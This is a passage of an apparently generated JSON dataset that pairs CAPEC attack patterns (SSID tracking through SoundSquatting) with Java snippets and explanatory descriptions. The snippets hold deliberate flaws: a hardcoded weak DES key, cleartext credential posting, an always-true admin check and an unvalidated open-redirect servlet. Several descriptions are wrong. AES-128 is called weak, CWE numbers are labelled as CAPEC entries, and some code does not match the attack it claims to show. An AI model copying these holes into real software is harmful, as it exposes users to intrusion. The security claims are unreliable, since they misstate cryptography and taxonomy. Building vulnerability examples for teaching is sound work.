        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class WiFiSSIDTracker {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(8888);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String receivedData = new String(packet.getData(), 0, packet.getLength());\n            if (receivedData.contains(\"SSID:\")) {\n                String ssid = extractSSID(receivedData);\n                System.out.println(\"Tracked SSID: \" + ssid);\n            }\n        }\n    }\n\n    private static String extractSSID(String data) {\n        int startIndex = data.indexOf(\"SSID:\") + 5;\n        int endIndex = data.indexOf(';', startIndex);\n        return data.substring(startIndex, endIndex);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic implementation of a WiFi SSID tracker. The code listens for incoming UDP packets on port 8888, which simulates the passive listening for WiFi management frames. When a packet is received, it checks if the packet contains an SSID by looking for the 'SSID:' keyword. If found, it extracts and prints the SSID. This represents the CAPEC scenario where an attacker passively listens for WiFi SSID information to track users. The code also embodies CWE-201 by transmitting sensitive SSID information, CWE-300 by not verifying the identity of the sender, and CWE-1290 by potentially allowing unauthorized access to the SSID data."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport java.util.Base64;\n\npublic class SimCardAttack {\n    private static final String DES_ALGORITHM = \"DES\";\n    private static final String DES_KEY = \"12345678\"; // Weak DES key\n\n    public static void main(String[] args) {\n        try {\n            String payload = \"Malicious Java Applet\";\n            String encryptedPayload = encryptPayload(payload, DES_KEY);\n            sendOTAMessage(encryptedPayload);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String encryptPayload(String payload, String key) throws Exception {\n        Cipher cipher = Cipher.getInstance(DES_ALGORITHM);\n        SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), DES_ALGORITHM);\n        cipher.init(Cipher.ENCRYPT_MODE, keySpec);\n        byte[] encryptedBytes = cipher.doFinal(payload.getBytes());\n        return Base64.getEncoder().encodeToString(encryptedBytes);\n    }\n\n    private static void sendOTAMessage(String encryptedPayload) {\n        // Simulate sending an OTA message\n        System.out.println(\"Sending OTA message: \" + encryptedPayload);\n        // In a real scenario, this would send the encrypted payload to the SIM card\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Rooting SIM Cards' attack described in the CAPEC. The code uses a weak DES key (CWE-327: Use of a Broken or Risky Cryptographic Algorithm) to encrypt a payload, which represents a malicious Java applet. The encrypted payload is then sent as an OTA (Over-The-Air) message to the SIM card. The use of DES, a broken cryptographic algorithm, makes it feasible for an attacker to crack the key and send properly signed binary SMS messages to the device. This snippet highlights the vulnerability of using inadequate encryption strength (CWE-326) and the potential for abuse in SIM card operations."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableWiFiConnection {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/login\"); // CWE-319: Cleartext Transmission of Sensitive Information\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            String payload = \"username=admin&password=admin\";\n            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());\n            writer.write(payload);\n            writer.flush();\n            writer.close();\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Wi-Fi connection scenario where sensitive information is transmitted in cleartext (CWE-319). The code sends a POST request to a URL with login credentials in plaintext, which can be intercepted by an adversary using an Evil Twin Wi-Fi Attack. The code does not verify the identity of the endpoint (CWE-923) or ensure the integrity of the communication channel (CWE-924), making it susceptible to adversary-in-the-middle attacks (CAPEC-94). This example highlights the risks associated with improper verification and cleartext transmission of sensitive data over potentially compromised networks."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class RogueLocationExample {\n    public static void main(String[] args) {\n        String expectedPath = \"/trusted/path/resource.txt\";\n        String roguePath = \"/untrusted/path/resource.txt\";\n\n        // CWE-426: Untrusted Search Path\n        String resourcePath = args.length > 0 ? args[0] : expectedPath;\n\n        try {\n            // CWE-940: Improper Verification of Source of a Communication Channel\n            if (!resourcePath.equals(expectedPath)) {\n                System.out.println(\"Warning: Accessing resource from an untrusted path!\");\n            }\n\n            // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            String content = new String(Files.readAllBytes(Paths.get(resourcePath)));\n            System.out.println(\"Resource Content: \" + content);\n\n            // CWE-402: Transmission of Private Resources into a New Sphere ('Resource Leak')\n            // Simulating transmission of the resource content to an untrusted location\n            Files.write(Paths.get(roguePath), content.getBytes());\n            System.out.println(\"Resource content written to rogue path.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Establish Rogue Location' by simulating a scenario where a resource is accessed from an untrusted path. The code first checks if the resource path provided as an argument is different from the expected trusted path (CWE-426: Untrusted Search Path). If the path is untrusted, it warns the user (CWE-940: Improper Verification of Source of a Communication Channel). It then reads the content of the resource, potentially exposing sensitive information (CWE-200: Exposure of Sensitive Information to an Unauthorized Actor). Finally, it writes the content to a rogue path, simulating the transmission of private resources to an untrusted location (CWE-402: Transmission of Private Resources into a New Sphere). This snippet embodies the main idea of the CAPEC by showing how an adversary can exploit untrusted paths to establish a rogue location and access or manipulate sensitive resources."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class RogueBaseStation {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Rogue Base Station is running...\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket socket) {\n        this.clientSocket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);\n\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                // Simulate improper verification of source\n                System.out.println(\"Received: \" + inputLine);\n                out.println(\"Echo: \" + inputLine);\n            }\n\n            in.close();\n            out.close();\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a rogue base station attack. The `RogueBaseStation` class sets up a server socket that listens for incoming connections on port 8080. When a client connects, it spawns a new thread to handle the communication with the client. The `ClientHandler` class reads input from the client and echoes it back without verifying the source of the communication. This lack of verification represents CWE-940 (Improper Verification of Source of a Communication Channel) and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints). The code also does not ensure message integrity (CWE-924) and allows any client to connect, simulating the scenario where a cellular device connects to the strongest signal without verifying its legitimacy."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.OutputStream;\nimport java.io.InputStream;\n\npublic class CellularBroadcastAttack {\n    private static final String TARGET_PHONE_NUMBER = \"1234567890\";\n    private static final String BROADCAST_URL = \"http://example.com/sendBroadcast\";\n\n    public static void main(String[] args) {\n        try {\n            // Create URL object\n            URL url = new URL(BROADCAST_URL);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setDoOutput(true);\n\n            // Insert sensitive information into sent data (CWE-201)\n            String postData = \"phoneNumber=\" + TARGET_PHONE_NUMBER;\n            OutputStream os = connection.getOutputStream();\n            os.write(postData.getBytes());\n            os.flush();\n            os.close();\n\n            // Improper verification of source of a communication channel (CWE-940)\n            InputStream response = connection.getInputStream();\n            byte[] responseData = new byte[1024];\n            int length = response.read(responseData);\n            String responseString = new String(responseData, 0, length);\n\n            // Print response (for demonstration purposes)\n            System.out.println(\"Response: \" + responseString);\n\n            response.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Cellular Broadcast Message Request' attack scenario. The code sends a broadcast message request to a server, including the target's phone number in the request data (CWE-201: Insertion of Sensitive Information Into Sent Data). The server's response is then read without proper verification of the source (CWE-940: Improper Verification of Source of a Communication Channel). This code represents the main idea of the CAPEC by showing how an attacker could trigger a broadcast message to locate a target based on their phone number."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.util.Arrays;\n\npublic class SignalStrengthTracker {\n    private static final int PORT = 9876;\n    private static final String TARGET_MAC = \"00:11:22:33:44:55\";\n\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket(PORT);\n        byte[] receiveData = new byte[1024];\n\n        while (true) {\n            DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);\n            socket.receive(receivePacket);\n            String message = new String(receivePacket.getData(), 0, receivePacket.getLength());\n\n            // CWE-201: Insertion of Sensitive Information Into Sent Data\n            if (message.contains(TARGET_MAC)) {\n                InetAddress IPAddress = receivePacket.getAddress();\n                int port = receivePacket.getPort();\n                String response = \"Tracking signal strength for MAC: \" + TARGET_MAC;\n                DatagramPacket sendPacket = new DatagramPacket(response.getBytes(), response.length(), IPAddress, port);\n                socket.send(sendPacket);\n            }\n\n            // CWE-940: Improper Verification of Source of a Communication Channel\n            if (!verifySource(receivePacket.getAddress())) {\n                System.out.println(\"Warning: Unverified source detected.\");\n                continue;\n            }\n\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n            if (!verifyMessageIntegrity(message)) {\n                System.out.println(\"Warning: Message integrity compromised.\");\n                continue;\n            }\n        }\n    }\n\n    private static boolean verifySource(InetAddress address) {\n        // Dummy verification for example purposes\n        return address.getHostAddress().startsWith(\"192.168.\");\n    }\n\n    private static boolean verifyMessageIntegrity(String message) {\n        // Dummy integrity check for example purposes\n        return message.length() > 0 && !message.contains(\"error\");\n    }\n}",
        "description": "This Java code snippet represents a simplified version of a signal strength tracking system. The main idea is to monitor incoming UDP packets for a specific target MAC address and respond with a message indicating tracking. The code includes vulnerabilities related to the CAPEC description and CWEs: \n\n1. **CWE-201: Insertion of Sensitive Information Into Sent Data** - The code sends a response containing sensitive information (the target MAC address) without proper protection.\n2. **CWE-940: Improper Verification of Source of a Communication Channel** - The code includes a basic and insufficient verification of the source IP address.\n3. **CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel** - The code performs a rudimentary check for message integrity, which is not robust.\n\nThis snippet demonstrates how an attacker could exploit these weaknesses to track the signal strength and potentially identify the source location of the signal."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.SecureRandom;\n\npublic class EncryptionExample {\n    public static void main(String[] args) throws Exception {\n        // Generate a strong AES key\n        SecretKey strongKey = generateKey(\"AES\", 256);\n        // Generate a weak DES key\n        SecretKey weakKey = generateKey(\"DES\", 56);\n\n        // Simulate negotiation and force downgrade to weak encryption\n        SecretKey selectedKey = negotiateKey(strongKey, weakKey);\n\n        // Encrypt data with the selected (weaker) key\n        Cipher cipher = Cipher.getInstance(selectedKey.getAlgorithm());\n        cipher.init(Cipher.ENCRYPT_MODE, selectedKey);\n        byte[] encryptedData = cipher.doFinal(\"Sensitive Data\".getBytes());\n\n        System.out.println(\"Encrypted Data: \" + new String(encryptedData));\n    }\n\n    private static SecretKey generateKey(String algorithm, int keySize) throws NoSuchAlgorithmException {\n        KeyGenerator keyGen = KeyGenerator.getInstance(algorithm);\n        keyGen.init(keySize, new SecureRandom());\n        return keyGen.generateKey();\n    }\n\n    private static SecretKey negotiateKey(SecretKey strongKey, SecretKey weakKey) {\n        // Simulate a downgrade attack by always selecting the weaker key\n        return weakKey;\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker forces the encryption level to be lowered, embodying the 'Drop Encryption Level' CAPEC. The code generates two cryptographic keys: a strong AES key and a weak DES key. During the key negotiation process, the code simulates an attack by always selecting the weaker DES key, thus enabling a successful attack against the encrypted data. This example also touches on related CWEs such as 'Selection of Less-Secure Algorithm During Negotiation' (CWE-757) and 'Inadequate Encryption Strength' (CWE-326). The code highlights the vulnerability of using weaker encryption algorithms and the potential risks associated with algorithm downgrade attacks."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "import java.io.OutputStream;\nimport java.net.Socket;\n\npublic class VulnerableVoIPClient {\n    public static void main(String[] args) {\n        String serverAddress = \"192.168.1.100\";\n        int port = 5000;\n        String sensitiveData = \"User: JohnDoe, Password: 12345\";\n\n        try (Socket socket = new Socket(serverAddress, port);\n             OutputStream out = socket.getOutputStream()) {\n            // Simulate VoIP data transmission with sensitive information\n            byte[] data = sensitiveData.getBytes();\n            out.write(data);\n            out.flush();\n\n            // Simulate timing and size patterns\n            for (int i = 0; i < 10; i++) {\n                byte[] packet = new byte[1024]; // Fixed packet size\n                out.write(packet);\n                out.flush();\n                Thread.sleep(100); // Fixed timing interval\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable VoIP client that transmits sensitive information over a network. The code demonstrates several weaknesses: \n1. CWE-201: Insertion of Sensitive Information Into Sent Data - The sensitive data (username and password) is included in the transmitted data.\n2. CWE-319: Cleartext Transmission of Sensitive Information - The sensitive data is sent in cleartext, making it susceptible to interception.\n3. CWE-385: Covert Timing Channel - The fixed timing intervals and packet sizes can be analyzed by an attacker to infer information about the communication.\n4. CWE-208: Observable Timing Discrepancy - The consistent timing patterns can reveal information about the state of the communication.\n\nThe main idea of the CAPEC is to highlight how an attacker can analyze packet timing and sizes to gain valuable information, even if the data itself is encrypted. This code snippet embodies this by showing how sensitive information can be transmitted in a way that is vulnerable to such analysis."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.InvalidKeyException;\nimport java.util.Base64;\n\npublic class VulnerableCrypto {\n    public static void main(String[] args) throws Exception {\n        // Generate a secret key for AES encryption\n        SecretKey secretKey = generateKey();\n        String plainText = \"Sensitive Data\";\n\n        // Encrypt the data\n        String cipherText = encrypt(plainText, secretKey);\n        System.out.println(\"Encrypted Text: \" + cipherText);\n\n        // Simulate sending encrypted data over a channel\n        sendOverChannel(cipherText);\n    }\n\n    private static SecretKey generateKey() throws NoSuchAlgorithmException {\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"AES\");\n        keyGen.init(128); // Use a weak key size\n        return keyGen.generateKey();\n    }\n\n    private static String encrypt(String plainText, SecretKey secretKey) throws Exception {\n        Cipher cipher = Cipher.getInstance(\"AES\");\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        byte[] encryptedBytes = cipher.doFinal(plainText.getBytes());\n        return Base64.getEncoder().encodeToString(encryptedBytes);\n    }\n\n    private static void sendOverChannel(String data) {\n        // Simulate sending data over an insecure channel\n        System.out.println(\"Sending data: \" + data);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive data is encrypted using a weak cryptographic algorithm (AES with a 128-bit key) and then transmitted over an insecure channel. This embodies the main idea of the CAPEC 'Electromagnetic Side-Channel Attack' by highlighting vulnerabilities such as the use of a weak cryptographic algorithm (CWE-327) and the transmission of sensitive information over an insecure channel (CWE-201). The code does not include any protection against physical side-channel attacks (CWE-1300), making it susceptible to electromagnetic emanations that could be monitored by an attacker to recover the cryptographic key or the sensitive data being processed."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class SensitiveDataTransmitter {\n    private static final String SERVER_ADDRESS = \"192.168.1.100\";\n    private static final int SERVER_PORT = 8080;\n\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\";\n        try {\n            sendSensitiveData(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void sendSensitiveData(String data) throws IOException {\n        Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(data.getBytes());\n        outputStream.flush();\n        outputStream.close();\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where sensitive information (a user's password) is transmitted over a network without proper protection. The `SensitiveDataTransmitter` class contains a method `sendSensitiveData` that sends the sensitive data to a server. This code is vulnerable to several issues related to the CAPEC and CWEs provided:\n\n1. **Insertion of Sensitive Information Into Sent Data (CWE-201)**: The code directly sends sensitive information (password) over the network without encryption, making it accessible to any intercepting party.\n2. **Improper Protection of Physical Side Channels (CWE-1300)**: The code does not implement any measures to protect against physical side-channel attacks, such as electromagnetic emissions that could be analyzed to infer the transmitted data.\n3. **Improper Protection for Outbound Error Messages and Alert Signals (CWE-1320)**: The code does not handle potential errors securely, which could be exploited by an attacker to disable alerts or responses.\n4. **Improper Protection against Electromagnetic Fault Injection (CWE-1319)**: The device running this code could be susceptible to electromagnetic fault injection attacks, potentially compromising internal information.\n5. **Exposure of Sensitive Information during Transient Execution (CWE-1420)**: The code does not account for transient execution vulnerabilities that could expose sensitive data through covert channels.\n\nOverall, this code snippet embodies the main idea of the CAPEC by demonstrating how unintentional signals and lack of proper protection can lead to the disclosure of sensitive information."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "public class HardwareDevice {\n    private boolean voltageGlitchDetected = false;\n    private boolean clockGlitchDetected = false;\n    private boolean overheatingDetected = false;\n    private boolean coldEnvironmentDetected = false;\n\n    public void performCryptographicOperation() {\n        if (voltageGlitchDetected || clockGlitchDetected || overheatingDetected || coldEnvironmentDetected) {\n            throw new SecurityException(\"Fault injection detected, aborting operation.\");\n        }\n        // Simulate cryptographic operation\n        System.out.println(\"Performing cryptographic operation...\");\n    }\n\n    public void detectVoltageGlitch() {\n        // Simulate detection logic\n        voltageGlitchDetected = true;\n    }\n\n    public void detectClockGlitch() {\n        // Simulate detection logic\n        clockGlitchDetected = true;\n    }\n\n    public void detectOverheating() {\n        // Simulate detection logic\n        overheatingDetected = true;\n    }\n\n    public void detectColdEnvironment() {\n        // Simulate detection logic\n        coldEnvironmentDetected = true;\n    }\n\n    public static void main(String[] args) {\n        HardwareDevice device = new HardwareDevice();\n        device.detectVoltageGlitch();\n        try {\n            device.performCryptographicOperation();\n        } catch (SecurityException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet represents a simplified model of a hardware device that performs cryptographic operations. The device includes basic detection mechanisms for various fault injection attacks such as voltage glitches, clock glitches, overheating, and cold environments. If any of these faults are detected, the cryptographic operation is aborted to prevent potential security breaches. This code embodies the main idea of CAPEC-1247, CAPEC-1248, CAPEC-1256, CAPEC-1319, CAPEC-1332, CAPEC-1334, CAPEC-1338, and CAPEC-1351 by demonstrating how a device might detect and respond to various fault injection attacks to protect sensitive information."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "public class MobileDevice {\n    private boolean voltageGlitchDetected = false;\n    private boolean clockGlitchDetected = false;\n    private boolean electromagneticFaultDetected = false;\n    private boolean overheatingDetected = false;\n    private boolean coldEnvironmentDetected = false;\n\n    public void performCryptographicOperation() {\n        if (voltageGlitchDetected || clockGlitchDetected || electromagneticFaultDetected || overheatingDetected || coldEnvironmentDetected) {\n            throw new SecurityException(\"Fault injection detected. Aborting operation.\");\n        }\n        // Perform cryptographic operation\n        System.out.println(\"Performing secure cryptographic operation...\");\n    }\n\n    public void detectVoltageGlitch() {\n        // Simulate detection of a voltage glitch\n        voltageGlitchDetected = true;\n    }\n\n    public void detectClockGlitch() {\n        // Simulate detection of a clock glitch\n        clockGlitchDetected = true;\n    }\n\n    public void detectElectromagneticFault() {\n        // Simulate detection of an electromagnetic fault\n        electromagneticFaultDetected = true;\n    }\n\n    public void detectOverheating() {\n        // Simulate detection of overheating\n        overheatingDetected = true;\n    }\n\n    public void detectColdEnvironment() {\n        // Simulate detection of a cold environment\n        coldEnvironmentDetected = true;\n    }\n\n    public static void main(String[] args) {\n        MobileDevice device = new MobileDevice();\n        device.detectVoltageGlitch(); // Simulate a fault injection attack\n        try {\n            device.performCryptographicOperation();\n        } catch (SecurityException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet represents a simplified model of a mobile device that performs cryptographic operations. The device includes mechanisms to detect various types of fault injections, such as voltage glitches, clock glitches, electromagnetic faults, overheating, and cold environments. If any of these faults are detected, the cryptographic operation is aborted to prevent potential security breaches. This code embodies the main idea of the CAPEC by demonstrating how a device can protect against fault injection attacks, which can compromise secret key information. The related CWEs provide context for the types of faults that need to be detected and mitigated."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "import java.awt.image.BufferedImage;\nimport java.io.File;\nimport javax.imageio.ImageIO;\n\npublic class SmudgeAttack {\n    public static void main(String[] args) {\n        try {\n            // Load an image of the touchscreen with smudges\n            BufferedImage image = ImageIO.read(new File(\"touchscreen_smudge.png\"));\n            \n            // Analyze the image to detect smudge patterns\n            String detectedPattern = analyzeSmudgePattern(image);\n            \n            // Use the detected pattern to simulate an authentication attempt\n            if (authenticateUsingPattern(detectedPattern)) {\n                System.out.println(\"Authentication successful using smudge pattern!\");\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static String analyzeSmudgePattern(BufferedImage image) {\n        // Placeholder for image analysis logic\n        // In a real scenario, this would involve complex image processing to detect smudge patterns\n        return \"1234\"; // Simulated detected pattern\n    }\n\n    private static boolean authenticateUsingPattern(String pattern) {\n        // Placeholder for authentication logic\n        // In a real scenario, this would involve sending the pattern to the authentication system\n        String correctPattern = \"1234\"; // Simulated correct pattern\n        return pattern.equals(correctPattern);\n    }\n}",
        "description": "This Java code snippet simulates a smudge attack on a touchscreen device. The code loads an image of the touchscreen with smudges, analyzes the image to detect smudge patterns, and then uses the detected pattern to attempt authentication. The `analyzeSmudgePattern` method is a placeholder for the image processing logic that would detect the smudge pattern left by the user's fingers. The `authenticateUsingPattern` method simulates the authentication process using the detected pattern. This code embodies the main idea of the CAPEC by demonstrating how smudge patterns can be used to bypass authentication on a touchscreen device. The related CWEs provide additional context, such as the lack of protection against physical side channels (CWE-1300) and the potential for authentication bypass (CWE-294)."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "import java.util.Random;\n\npublic class GPSReceiver {\n    private static final double TRUE_LATITUDE = 37.7749;\n    private static final double TRUE_LONGITUDE = -122.4194;\n    private static final double TRUE_ALTITUDE = 30.0;\n\n    public static void main(String[] args) {\n        double[] spoofedCoordinates = getSpoofedCoordinates();\n        System.out.println(\"Received GPS Coordinates: \");\n        System.out.println(\"Latitude: \" + spoofedCoordinates[0]);\n        System.out.println(\"Longitude: \" + spoofedCoordinates[1]);\n        System.out.println(\"Altitude: \" + spoofedCoordinates[2]);\n    }\n\n    private static double[] getSpoofedCoordinates() {\n        Random random = new Random();\n        double spoofedLatitude = TRUE_LATITUDE + (random.nextDouble() - 0.5) * 0.1;\n        double spoofedLongitude = TRUE_LONGITUDE + (random.nextDouble() - 0.5) * 0.1;\n        double spoofedAltitude = TRUE_ALTITUDE + (random.nextDouble() - 0.5) * 10;\n        return new double[]{spoofedLatitude, spoofedLongitude, spoofedAltitude};\n    }\n}",
        "description": "This Java code snippet simulates a GPS receiver that is vulnerable to counterfeit GPS signals. The `getSpoofedCoordinates` method generates random coordinates that deviate slightly from the true coordinates, mimicking the effect of an adversary broadcasting spoofed GPS signals. The main function prints these spoofed coordinates, demonstrating how the receiver could be deceived. This example embodies the CAPEC concept of 'Counterfeit GPS Signals' and highlights related weaknesses such as 'Improper Verification of Source of a Communication Channel' (CWE-940) and 'Improper Enforcement of Message Integrity During Transmission in a Communication Channel' (CWE-924). The code does not verify the authenticity of the GPS signals, making it susceptible to spoofing attacks."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "import java.util.Random;\n\npublic class GPSSpoofingAttack {\n    private static final double TRUE_LATITUDE = 40.7128;\n    private static final double TRUE_LONGITUDE = -74.0060;\n    private static double spoofedLatitude = TRUE_LATITUDE;\n    private static double spoofedLongitude = TRUE_LONGITUDE;\n    private static final Random random = new Random();\n\n    public static void main(String[] args) {\n        for (int i = 0; i < 10; i++) {\n            spoofGPS();\n            System.out.println(\"Spoofed Coordinates: \" + spoofedLatitude + \", \" + spoofedLongitude);\n        }\n    }\n\n    private static void spoofGPS() {\n        // Gradually increase the deviation from the true coordinates\n        spoofedLatitude += random.nextDouble() * 0.01;\n        spoofedLongitude += random.nextDouble() * 0.01;\n    }\n}\n",
        "description": "This Java code snippet simulates a basic GPS spoofing attack, embodying the main idea of the 'Carry-Off GPS Attack' described in the CAPEC. The code starts with true GPS coordinates and gradually modifies them to simulate the process of carrying off the target from their intended destination. The `spoofGPS` method increases the deviation from the true coordinates incrementally, representing the gradual increase in power of counterfeit signals. This snippet also highlights potential vulnerabilities related to CWE-290 (Authentication Bypass by Spoofing) and CWE-940 (Improper Verification of Source of a Communication Channel), as it does not verify the authenticity of the GPS signals, making it susceptible to spoofing attacks."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "import java.io.*;\n\npublic class VulnerableResourceHandler {\n    private static final String FILE_PATH = \"C:\\\\temp\\\\data.txt\";\n\n    public static void main(String[] args) {\n        try {\n            // CWE-67: Improper Handling of Windows Device Names\n            String userInput = \"CON\"; // Simulating user input\n            File file = new File(FILE_PATH + userInput);\n            BufferedReader reader = new BufferedReader(new FileReader(file));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n\n            // CWE-772: Missing Release of Resource after Effective Lifetime\n            FileOutputStream fos = new FileOutputStream(FILE_PATH);\n            fos.write(\"Some data\".getBytes());\n            // Missing fos.close();\n\n            // CWE-863: Incorrect Authorization\n            if (isAdminUser()) {\n                System.out.println(\"Access granted to admin resource.\");\n            } else {\n                System.out.println(\"Access granted to regular resource.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isAdminUser() {\n        // Simulating an incorrect authorization check\n        return true; // This should be a proper check based on user credentials\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the deprecated CAPEC 'Unauthorized Use of Device Resources' and its associated CWEs. The code includes:\n\n1. CWE-67: Improper Handling of Windows Device Names - The code constructs a file path using user input without properly handling Windows device names, which can lead to denial of service or information exposure.\n\n2. CWE-772: Missing Release of Resource after Effective Lifetime - The code opens a FileOutputStream but does not close it, leading to resource leakage.\n\n3. CWE-863: Incorrect Authorization - The code performs an authorization check using a hardcoded return value, allowing unauthorized access to resources.\n\nThese vulnerabilities illustrate the main idea of the deprecated CAPEC by showing how improper handling of resources and authorization can lead to unauthorized use and potential exploitation of device resources."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class RedirectServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String targetUrl = request.getParameter(\"url\");\n        if (targetUrl != null && !targetUrl.isEmpty()) {\n            response.sendRedirect(targetUrl);\n        } else {\n            response.sendRedirect(\"/defaultPage\");\n        }\n    }\n}\n",
        "description": "This Java servlet code snippet demonstrates a potential vulnerability related to TypoSquatting and the associated CWEs. The servlet takes a 'url' parameter from the HTTP request and redirects the user to that URL. This can be exploited by an attacker to perform a URL Redirection to an untrusted site (CWE-601), facilitating phishing attacks. The code does not validate the 'url' parameter, which can lead to improper neutralization of invalid characters (CWE-86) and potentially allow for authentication bypass by spoofing (CWE-290). Additionally, incorrect comparison (CWE-697) and misinterpretation of input (CWE-115) can further exacerbate the vulnerability, making it easier for an attacker to exploit the TypoSquatting technique."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
